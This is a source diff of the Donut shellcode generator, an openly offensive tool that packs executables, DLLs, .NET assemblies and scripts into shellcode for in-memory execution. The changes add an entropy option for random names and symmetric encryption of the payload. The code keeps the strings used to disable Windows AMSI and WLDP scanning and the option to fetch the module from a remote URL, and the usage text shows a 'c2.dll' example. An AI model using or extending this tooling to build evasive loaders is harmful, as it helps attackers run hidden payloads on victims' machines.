@@ -433,17 +433,6 @@ static int get_file_info(PDONUT_CONFIG c, file_info *fi) {
       
       // compress file?
       if(c->compress != DONUT_COMPRESS_NONE) {
-        switch(c->compress) {
-          case DONUT_COMPRESS_LZNT1:
-            engine = COMPRESSION_FORMAT_LZNT1;
-            break;
-          case DONUT_COMPRESS_XPRESS:
-            engine = COMPRESSION_FORMAT_XPRESS;
-            break;
-          case DONUT_COMPRESS_XPRESS_HUFF:
-            engine = COMPRESSION_FORMAT_XPRESS_HUFF;
-            break;
-        }
         m = GetModuleHandle("ntdll");
         RtlGetCompressionWorkSpaceSize = (RtlGetCompressionWorkSpaceSize_t)GetProcAddress(m, "RtlGetCompressionWorkSpaceSize");
         RtlCompressBuffer              = (RtlCompressBuffer_t)GetProcAddress(m, "RtlCompressBuffer");
@@ -456,7 +445,7 @@ static int get_file_info(PDONUT_CONFIG c, file_info *fi) {
         
         DPRINT("Reading fragment and workspace size");
         nts = RtlGetCompressionWorkSpaceSize(
-          engine | COMPRESSION_ENGINE_MAXIMUM, 
+          c->compress | COMPRESSION_ENGINE_MAXIMUM, 
           &wspace, &fspace);
           
         if(nts == 0) {
@@ -468,7 +457,7 @@ static int get_file_info(PDONUT_CONFIG c, file_info *fi) {
             if(fi->zdata != NULL) {
               DPRINT("Compressing data");
               nts = RtlCompressBuffer(
-                engine | COMPRESSION_ENGINE_MAXIMUM, 
+                c->compress | COMPRESSION_ENGINE_MAXIMUM, 
                 fi->data, fi->len, fi->zdata, fi->len, 0, 
                 &fi->zlen, ws);
               if(nts == 0) {
@@ -538,10 +527,8 @@ static int is_dll_export(file_info *fi, const char *function) {
     return found;
 }
 
-#if !defined(NOCRYPTO)
 // returns 1 on success else <=0
 static int CreateRandom(void *buf, uint64_t len) {
-    
 #if defined(WINDOWS)
     HCRYPTPROV prov;
     int        ok;
@@ -595,19 +582,22 @@ static int GenRandomString(void *output, uint64_t len) {
     str[i] = 0;
     return 1;
 }
-#endif
 
 static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
-    PDONUT_MODULE mod = NULL;
-    uint32_t      len = 0;
-    int           err=DONUT_ERROR_SUCCESS;
+    PDONUT_MODULE mod     = NULL;
+    uint32_t      mod_len = 0, data_len;
+    void          *data   = NULL;
+    int           err     = DONUT_ERROR_SUCCESS;
     
     DPRINT("Entering.");
     
     // Allocate memory for module information and contents of file
-    len = sizeof(DONUT_MODULE) + (c->compress ? fi->zlen : fi->len);
-    DPRINT("Allocating %" PRIi32 " bytes of memory for DONUT_MODULE", len);
-    mod = calloc(len, 1);
+    data     = (c->compress == DONUT_COMPRESS_NONE) ? fi->data : fi->zdata;
+    data_len = (c->compress == DONUT_COMPRESS_NONE) ? fi->len  : fi->zlen;
+    mod_len  = data_len + sizeof(DONUT_MODULE);
+    
+    DPRINT("Allocating %" PRIi32 " bytes of memory for DONUT_MODULE", mod_len);
+    mod = calloc(mod_len, 1);
 
     // Memory not allocated? exit
     if(mod == NULL) {
@@ -616,43 +606,28 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     }
     
     // Set the type of module
-    mod->type   = fi->type;
-    mod->thread = c->thread;
-    mod->ansi   = c->ansi;
+    mod->type     = fi->type;
+    mod->thread   = c->thread;
+    mod->ansi     = c->ansi;
+    mod->compress = c->compress;
     
-    #ifdef WINDOWS
-    switch(c->compress) {
-      case DONUT_COMPRESS_LZNT1: {
-        DPRINT("Using LZNT1 engine to compress file");
-        mod->compress = COMPRESSION_FORMAT_LZNT1;
-        break;
-      }
-      case DONUT_COMPRESS_XPRESS: {
-        DPRINT("Using Xpress engine to compress file");
-        mod->compress = COMPRESSION_FORMAT_XPRESS;
-        break;
-      }
-      case DONUT_COMPRESS_XPRESS_HUFF: {
-        DPRINT("Using Xpress Huffman engine to compress file");
-        mod->compress = COMPRESSION_FORMAT_XPRESS_HUFF;
-        break;
-      }
-    }
-    #endif
     // DotNet assembly?
     if(mod->type == DONUT_MODULE_NET_DLL ||
        mod->type == DONUT_MODULE_NET_EXE)
     {
-      // If no domain name specified, generate a random one
+      // If no domain name specified
       if(c->domain[0] == 0) {
-        #if !defined(NOCRYPTO)
-        if(!GenRandomString(c->domain, DONUT_DOMAIN_LEN)) {
-          err = DONUT_ERROR_RANDOM;
-          goto cleanup;
-        }
-        #else
+        // If entropy enabled
+        if(c->entropy != DONUT_ENTROPY_NONE) {
+          // Generate random name
+          if(!GenRandomString(c->domain, DONUT_DOMAIN_LEN)) {
+            err = DONUT_ERROR_RANDOM;
+            goto cleanup;
+          }
+        } else {
+          // set to "AAAAAAAA"
           memset(c->domain, 'A', DONUT_DOMAIN_LEN);
-        #endif
+        }
       }
       // Set the domain name to use
       DPRINT("Domain  : %s", c->domain);
@@ -681,15 +656,18 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
       
     // Parameters specified?
     if(c->param[0] != 0) {
-      // if type is unmanaged EXE, generate a random program name
+      // if type is unmanaged EXE
       if(mod->type == DONUT_MODULE_EXE) {
-        #if !defined(NOCRYPTO)
-        GenRandomString(mod->param, 4);
-        mod->param[4] = ' ';
-        #else
-        memset(mod->param, 'A', 4);
-        mod->param[4] = ' ';
-        #endif
+        // and entropy is enabled
+        if(c->entropy != DONUT_ENTROPY_NONE) {
+          // generate 4-byte random name
+          GenRandomString(mod->param, 4);
+          mod->param[4] = ' ';
+        } else {
+          // else set to "AAAA "
+          memset(mod->param, 'A', 4);
+          mod->param[4] = ' ';
+        }
       }
       strncat(mod->param, c->param, DONUT_MAX_NAME-6);
     }
@@ -699,13 +677,12 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     mod->len  = fi->len;
     mod->zlen = fi->zlen;
     DPRINT("Copying data");
-    memcpy(&mod->data, c->compress ? fi->zdata : fi->data, c->compress ? fi->zlen : fi->len);
+    
+    memcpy(&mod->data, data, data_len);
     // update configuration with pointer to module
     c->mod     = mod;
-    c->mod_len = len;
-#if !defined(NOCRYPTO)
+    c->mod_len = mod_len;
 cleanup:
-#endif
     // if there was an error, free memory for module
     if(err != DONUT_ERROR_SUCCESS && mod != NULL) {
       free(mod);
@@ -717,13 +694,11 @@ cleanup:
 }
 
 static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
-  #ifndef NOCRYPTO
     DONUT_CRYPT     inst_key, mod_key;
-  #endif
-    PDONUT_INSTANCE inst;
-    uint64_t        inst_len;
-    uint64_t        dll_hash;
-    int             cnt;
+    PDONUT_INSTANCE inst = NULL;
+    int             inst_len = 0;
+    uint64_t        dll_hash = 0;
+    int             cnt = 0;
     
     DPRINT("Entering.");
     
@@ -738,37 +713,40 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
              "Adding to size of instance.", c->mod_len);
       inst_len += c->mod_len;
     }
+    DPRINT("Total length of instance : %"PRIi32, inst_len);
+    
     // allocate zero-initialized memory for instance
     inst = (PDONUT_INSTANCE)calloc(inst_len, 1);
-    
+
     // Memory allocation failed? exit
     if(inst == NULL) {
+      DPRINT("Memory allocation failed");
       return DONUT_ERROR_NO_MEMORY;
     }
     
-#if !defined(NOCRYPTO)
-    DPRINT("Generating random key for instance");
-    if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
-      return DONUT_ERROR_RANDOM;
+    if(c->entropy == DONUT_ENTROPY_DEFAULT) {
+      DPRINT("Generating random key for instance");
+      if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
+        return DONUT_ERROR_RANDOM;
+      }
+      memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
+      
+      DPRINT("Generating random key for module");
+      if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
+        return DONUT_ERROR_RANDOM;
+      }
+      memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
+      
+      DPRINT("Generating random string to verify decryption");
+      if(!GenRandomString(inst->sig, DONUT_SIG_LEN)) {
+        return DONUT_ERROR_RANDOM;
+      }
+     
+      DPRINT("Generating random IV for Maru hash");
+      if(!CreateRandom(&inst->iv, MARU_IV_LEN)) {
+        return DONUT_ERROR_RANDOM;
+      }
     }
-    memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
-    
-    DPRINT("Generating random key for module");
-    if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
-      return DONUT_ERROR_RANDOM;
-    }
-    memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
-    
-    DPRINT("Generating random string to verify decryption");
-    if(!GenRandomString(inst->sig, DONUT_SIG_LEN)) {
-      return DONUT_ERROR_RANDOM;
-    }
-   
-    DPRINT("Generating random IV for Maru hash");
-    if(!CreateRandom(&inst->iv, MARU_IV_LEN)) {
-      return DONUT_ERROR_RANDOM;
-    }
-#endif
 
     DPRINT("Generating hashes for API using IV: %" PRIX64, inst->iv);
     
@@ -834,8 +812,8 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     }
 
     // required to disable AMSI
-    strcpy(inst->clr,            "CLR");
-    strcpy(inst->amsi,           "AMSI");
+    strcpy(inst->clr,            "clr");
+    strcpy(inst->amsi,           "amsi");
     strcpy(inst->amsiInit,       "AmsiInitialize");
     strcpy(inst->amsiScanBuf,    "AmsiScanBuffer");
     strcpy(inst->amsiScanStr,    "AmsiScanString");
@@ -843,38 +821,55 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     // stuff for PE loader
     strcpy(inst->dataname,       ".data");
     strcpy(inst->kernelbase,     "kernelbase");
-    strcpy(inst->msvcrt,         "msvcrt");
+    
+    // ansi symbols
     strcpy(inst->acmdln,         "_acmdln");
+    strcpy(inst->_acmdln,        "__p__acmdln");
+    strcpy(inst->argv,           "__argv");
+    strcpy(inst->_argv,           "__p___argv");
+    
+    // unicode symbols
     strcpy(inst->wcmdln,         "_wcmdln");
+    strcpy(inst->_wcmdln,        "__p__wcmdln");
+    strcpy(inst->wargv,          "__wargv");
+    strcpy(inst->_wargv,          "__p___wargv");
+    
     strcpy(inst->exitproc1,      "ExitProcess");
     strcpy(inst->exitproc2,      "exit");
+    strcpy(inst->exitproc3,      "_exit");
+    strcpy(inst->exitproc4,      "_cexit");
+    strcpy(inst->exitproc5,      "_c_exit");
     
     // required to disable WLDP
-    strcpy(inst->wldp,           "WLDP");
+    strcpy(inst->wldp,           "wldp");
     strcpy(inst->wldpQuery,      "WldpQueryDynamicCodeTrust");
     strcpy(inst->wldpIsApproved, "WldpIsClassInApprovedList");
 
     // set the type of instance we're creating
     inst->type = c->inst_type;
     // indicate if we should call RtlExitUserProcess to terminate host process
-    inst->exit = c->exit;       
+    inst->exit_opt = c->exit_opt;       
 
+    // set the entropy level
+    inst->entropy = c->entropy;
+    
     // if the module will be downloaded
     // set the URL parameter and request verb
     if(inst->type == DONUT_INSTANCE_URL) {
-      #if !defined(NOCRYPTO)
-      // if no module name specified
-      if(c->modname[0] == 0) {
-        // generate a random name for module
-        // that will be saved to disk
-        if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
-          return DONUT_ERROR_RANDOM;
+      if(c->entropy != DONUT_ENTROPY_NONE) {
+        // if no module name specified
+        if(c->modname[0] == 0) {
+          // generate a random name for module
+          // that will be saved to disk
+          if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
+            return DONUT_ERROR_RANDOM;
+          }
+          DPRINT("Generated random name for module : %s", c->modname);
         }
-        DPRINT("Generated random name for module : %s", c->modname);
-      }
-      #else
+      } else {
+        // set to "AAAAAAAA"
         memset(c->modname, 'A', DONUT_MAX_MODNAME);
-      #endif
+      }
       DPRINT("Setting URL parameters");
       strcpy(inst->http.url, c->url);
       // append module name
@@ -890,8 +885,9 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     c->inst       = inst;
     c->inst_len   = inst_len;
     
-#if !defined(NOCRYPTO)
-    if(c->inst_type == DONUT_INSTANCE_URL) {
+    if(c->inst_type == DONUT_INSTANCE_URL && 
+       c->entropy == DONUT_ENTROPY_DEFAULT) 
+    {
       DPRINT("encrypting module for download");
       
       c->mod->mac = maru(inst->sig, inst->iv);
@@ -902,26 +898,25 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
         c->mod, 
         c->mod_len);
     }
-#endif
     // if PIC, copy module to instance
     if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Copying module data to instance");
       memcpy(&c->inst->module.x, c->mod, c->mod_len);
     }
     
-#if !defined(NOCRYPTO)
-    DPRINT("encrypting instance");
-    
-    inst->mac = maru(inst->sig, inst->iv);
-    
-    uint8_t *inst_data = (uint8_t*)inst + offsetof(DONUT_INSTANCE, api_cnt);
-    
-    donut_encrypt(
-      inst_key.mk, 
-      inst_key.ctr, 
-      inst_data, 
-      c->inst_len - offsetof(DONUT_INSTANCE, api_cnt));
-#endif
+    if(c->entropy == DONUT_ENTROPY_DEFAULT) {
+      DPRINT("encrypting instance");
+      
+      inst->mac = maru(inst->sig, inst->iv);
+      
+      uint8_t *inst_data = (uint8_t*)inst + offsetof(DONUT_INSTANCE, api_cnt);
+      
+      donut_encrypt(
+        inst_key.mk, 
+        inst_key.ctr, 
+        inst_data, 
+        c->inst_len - offsetof(DONUT_INSTANCE, api_cnt));
+    }
     DPRINT("Leaving.");
     
     return DONUT_ERROR_SUCCESS;
@@ -962,9 +957,9 @@ int DonutCreate(PDONUT_CONFIG c) {
       return DONUT_ERROR_INVALID_PARAMETER;
     }
     
-    DPRINT("Validating encoding");
-    if(c->encoding < DONUT_ENCODE_RAW || c->encoding > DONUT_ENCODE_HEX){
-      return DONUT_ERROR_INVALID_ENCODING;
+    DPRINT("Validating format");
+    if(c->format < DONUT_ENCODE_BINARY || c->format > DONUT_ENCODE_HEX){
+      return DONUT_ERROR_INVALID_FORMAT;
     }
     
     DPRINT("Validating compression");
@@ -975,6 +970,15 @@ int DonutCreate(PDONUT_CONFIG c) {
     {
       return DONUT_ERROR_INVALID_ENGINE;
     }
+    
+    DPRINT("Validating entropy level");
+    if(c->entropy != DONUT_ENTROPY_NONE   &&
+       c->entropy != DONUT_ENTROPY_RANDOM &&
+       c->entropy != DONUT_ENTROPY_DEFAULT)
+    {
+      return DONUT_ERROR_INVALID_ENTROPY;
+    }
+    
     if(c->inst_type == DONUT_INSTANCE_URL) {
       DPRINT("Validating URL");
       
@@ -1192,9 +1196,9 @@ int DonutCreate(PDONUT_CONFIG c) {
     
     // no output file specified?
     if(c->output[0] == 0) {
-      // set to default name based on encoding
-      switch(c->encoding) {
-        case DONUT_ENCODE_RAW:
+      // set to default name based on format
+      switch(c->format) {
+        case DONUT_ENCODE_BINARY:
           strncpy(c->output, "loader.bin", DONUT_MAX_NAME-1);
           break;
         case DONUT_ENCODE_BASE64:
@@ -1227,8 +1231,8 @@ int DonutCreate(PDONUT_CONFIG c) {
       goto cleanup;
     }
     
-    switch(c->encoding) {
-      case DONUT_ENCODE_RAW: {
+    switch(c->format) {
+      case DONUT_ENCODE_BINARY: {
         DPRINT("Saving loader as raw data");
         fwrite(c->pic, 1, c->pic_len, fd);
         err = DONUT_ERROR_SUCCESS;
@@ -1357,14 +1361,17 @@ const char *err2str(int err) {
       case DONUT_ERROR_NORELOC:
         str = "This file has no relocation information required for in-memory execution.";
         break;
-      case DONUT_ERROR_INVALID_ENCODING:
-        str = "The encoding format is invalid.";
+      case DONUT_ERROR_INVALID_FORMAT:
+        str = "The output format is invalid.";
         break;
       case DONUT_ERROR_INVALID_ENGINE:
         str = "The compression engine is invalid.";
         break;
       case DONUT_ERROR_COMPRESSION:
         str = "There was an error during compression.";
+        break;
+      case DONUT_ERROR_INVALID_ENTROPY:
+        str = "Invalid entropy level specified.";
         break;
     }
     return str;
@@ -1385,38 +1392,36 @@ static char* get_param (int argc, char *argv[], int *i) {
 
 
 static void usage (void) {
-    printf(" usage: donut [options] -f <EXE/DLL/VBS/JS>\n\n");
+    printf(" usage: donut [options] <EXE/DLL/VBS/JS>\n\n");
     printf("       Only the finest artisanal donuts are made of shells.\n\n");   
     printf("                   -MODULE OPTIONS-\n\n");
-    printf("       -f <path>            .NET assembly, EXE, DLL, VBS, JS file to execute in-memory.\n");
-#ifdef WINDOWS
-    printf("       -z <engine>          Pack/Compress file. 1=LZNT1, 2=Xpress, 3=Xpress Huffman\n");
-#endif
-    printf("       -n <name>            Module name. Randomly generated by default.\n");
-    printf("       -w                   Command line is passed to unmanaged DLL function as ANSI. (default is UNICODE)\n");
-    printf("       -u <URL>             HTTP server that will host the donut module.\n\n");
-
+    printf("       -n <name>            Module name. Randomly generated by default with entropy enabled.\n");
+    printf("       -u <URL>             HTTP server that will host the donut module.\n");
+    printf("       -e <level>           Entropy. 1=disable, 2=use random names, 3=random names + symmetric encryption (default)\n\n");
+    
     printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
-    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=amd64+x86(default).\n");
+    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).\n");
     printf("       -b <level>           Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)\n");
-    
     printf("       -o <outfile_file>    Default is \"loader.bin\"\n");
-    printf("       -e <format>          Output in the specified format. 1=raw (default), 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=C#, 8=hex\n");
+    printf("       -f <format>          Output format. 1=raw (default), 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=C#, 8=hex\n");
+    printf("       -x <action>          Exiting. 1=exit thread (default), 2=exit process\n\n");
 
-    printf("       -t                   Run entrypoint for unmanaged EXE as a new thread. (replaces ExitProcess with ExitThread in IAT)\n");
-    printf("       -x                   Call RtlExitUserProcess to terminate the host process. (RtlExitUserThread is called by default)\n\n");
-    
-    printf("                   -DOTNET OPTIONS-\n\n");
+    printf("                   -FILE OPTIONS-\n\n");
     printf("       -c <namespace.class> Optional class name.  (required for .NET DLL)\n");
+    printf("       -d <name>            AppDomain name to create for .NET. Randomly generated by default with entropy enabled.\n");
     printf("       -m <method | api>    Optional method or API name for DLL. (a method is required for .NET DLL)\n");
-    printf("       -p <parameters>      Optional parameters inside quotations.\n");
+    printf("       -p <parameters>      Optional parameters/command line inside quotations for DLL method/function or EXE.\n");
+    printf("       -w                   Command line is passed to unmanaged DLL function as ANSI. (default is UNICODE)\n");
     printf("       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n");
-    printf("       -d <name>            AppDomain name to create for .NET. Randomly generated by default.\n\n");
+    printf("       -t                   Run entrypoint of unmanaged EXE as a thread.\n");
+#ifdef WINDOWS
+    printf("       -z <engine>          Pack/Compress file. 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman (default)\n\n");
+#endif
 
     printf(" examples:\n\n");
-    printf("    donut -f c2.dll\n");
-    printf("    donut -a1 -cTestClass -mRunProcess -pnotepad.exe -floader.dll\n");
-    printf("    donut -f loader.dll -c TestClass -m RunProcess -p\"calc notepad\" -u http://remote_server.com/modules/\n");
+    printf("    donut c2.dll\n");
+    printf("    donut -a1 -cTestClass -mRunProcess -pnotepad.exe loader.dll\n");
+    printf("    donut loader.dll -c TestClass -m RunProcess -p\"calc notepad\" -u http://remote_server.com/modules/\n");
     
     exit (0);
 }
@@ -1426,8 +1431,8 @@ int main(int argc, char *argv[]) {
     char         opt;
     int          i, err;
     char         *mod_type;
-    char         *arch_str[3] = { "x86", "AMD64", "x86+AMD64" };
-    char         *inst_type[2]= { "PIC", "URL"   };
+    char         *arch_str[3] = { "x86", "amd64", "x86+amd64" };
+    char         *inst_type[2]= { "PIC", "URL" };
     
     printf("\n");
     printf("  [ Donut shellcode generator v0.9.3\n");
@@ -1440,109 +1445,111 @@ int main(int argc, char *argv[]) {
     c.inst_type = DONUT_INSTANCE_PIC;
     c.arch      = DONUT_ARCH_X84;
     c.bypass    = DONUT_BYPASS_CONTINUE;  // continues loading even if disabling AMSI/WLDP fails
-    c.encoding  = DONUT_ENCODE_RAW;       // default encoding
+    c.format    = DONUT_ENCODE_BINARY;    // default format
     c.compress  = DONUT_COMPRESS_NONE;    // compression is disabled by default
-    c.thread    = 0;                      // run entrypoint for unmanaged EXE without thread
+    c.entropy   = DONUT_ENTROPY_DEFAULT;  // enable random names + symmetric encryption by default
+    c.exit_opt  = DONUT_OPT_EXIT_THREAD;  // default behaviour is to exit the thread
     c.ansi      = 0;                      // command line will be converted to unicode
-    c.exit      = 0;                      // don't call RtlExitUserProcess to terminate host process
     
     // parse arguments
     for(i=1; i<argc; i++) {
       // switch?
-      if(argv[i][0] != '-' && argv[i][0] != '/') {
-        usage();
-      }
-      opt = argv[i][1];
-      
-      switch(opt) {
-        // target cpu architecture
-        case 'a': {
-          c.arch = atoi(get_param(argc, argv, &i));
-          break;
+      if(argv[i][0] == '-') {
+        opt = argv[i][1];
+        
+        switch(opt) {
+          // target cpu architecture
+          case 'a': {
+            c.arch = atoi(get_param(argc, argv, &i));
+            break;
+          }
+          // bypass options
+          case 'b': {
+            c.bypass = atoi(get_param(argc, argv, &i));
+            break;
+          }
+          // class of .NET assembly
+          case 'c': {
+            strncpy(c.cls, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
+            break;
+          }
+          // name of domain to use for .NET assembly
+          case 'd': {
+            strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
+            break;
+          }
+          // encryption options
+          case 'e': {
+            c.entropy = atoi(get_param(argc, argv, &i));
+            break;
+          }
+          // output format
+          case 'f': {
+            c.format = atoi(get_param(argc, argv, &i));
+            break;
+          }
+          // method of .NET assembly
+          case 'm': {
+            strncpy(c.method, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
+            break;
+          }
+          // module name
+          case 'n': {
+            strncpy(c.modname, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
+            break;
+          }
+          // output file for loader
+          case 'o': {
+            strncpy(c.output, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
+            break;
+          }
+          // parameters to method, DLL function or command line for unmanaged EXE
+          case 'p': {
+            strncpy(c.param, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
+            break;
+          }
+          // runtime version to use for .NET DLL / EXE
+          case 'r': {
+            strncpy(c.runtime, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
+            break;
+          }
+          // run entrypoint of unmanaged EXE as a thread
+          case 't': {
+            c.thread = 1;
+            break;
+          }
+          // URL of remote module
+          case 'u': {
+            strncpy(c.url, get_param(argc, argv, &i), DONUT_MAX_URL - 2);
+            c.inst_type = DONUT_INSTANCE_URL;
+            break;
+          }
+          // don't convert command line to unicode? only applies to unmanaged DLL function
+          case 'w': {
+            c.ansi = 1;
+            break;
+          }
+          // call RtlExitUserProcess to terminate host process
+          case 'x': {
+            c.exit_opt = atoi(get_param(argc, argv, &i)); 
+            break;
+          }
+          #ifdef WINDOWS
+          // pack/compress input file
+          case 'z': {
+            c.compress = atoi(get_param(argc, argv, &i));
+            break;
+          }
+          #endif
+          // for anything else, display usage
+          default: {
+            usage();
+            break;
+          }
         }
-        // bypass options
-        case 'b': {
-          c.bypass = atoi(get_param(argc, argv, &i));
-          break;
-        }
-        // class of .NET assembly
-        case 'c': {
-          strncpy(c.cls, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
-          break;
-        }
-        // name of domain to use for .NET assembly
-        case 'd': {
-          strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
-          break;
-        }
-        // encoding format
-        case 'e': {
-          c.encoding = atoi(get_param(argc, argv, &i));
-          break;
-        }
-        // EXE/DLL/VBS/JS file to embed in shellcode
-        case 'f': {
-          strncpy(c.input, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
-          break;
-        }
-        // method of .NET assembly
-        case 'm': {
-          strncpy(c.method, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
-          break;
-        }
-        // module name
-        case 'n': {
-          strncpy(c.modname, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
-          break;
-        }
-        // output file for loader
-        case 'o': {
-          strncpy(c.output, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
-          break;
-        }
-        // parameters to method, DLL function or command line for unmanaged EXE
-        case 'p': {
-          strncpy(c.param, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
-          break;
-        }
-        // runtime version to use for .NET DLL / EXE
-        case 'r': {
-          strncpy(c.runtime, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
-          break;
-        }
-        // run entrypoint for unmanaged EXE as thread?
-        case 't': {
-          c.thread = 1;
-          break;
-        }
-        // URL of remote module
-        case 'u': {
-          strncpy(c.url, get_param(argc, argv, &i), DONUT_MAX_URL - 2);
-          c.inst_type = DONUT_INSTANCE_URL;
-          break;
-        }
-        // don't convert command line to unicode? only applies to unmanaged DLL function
-        case 'w': {
-          c.ansi = 1;
-          break;
-        }
-        // call RtlExitUserProcess to terminate host process
-        case 'x': {
-          c.exit = 1;
-          break;
-        }
-        #ifdef WINDOWS
-        // pack/compress input file
-        case 'z': {
-          c.compress = atoi(get_param(argc, argv, &i));
-          break;
-        }
-        #endif
-        // for anything else, display usage
-        default: {
-          usage();
-          break;
-        }
+      } else {
+        // assume it's an EXE/DLL/VBS/JS file to embed in shellcode
+        strncpy(c.input, argv[i], DONUT_MAX_NAME - 1);
       }
     }
     
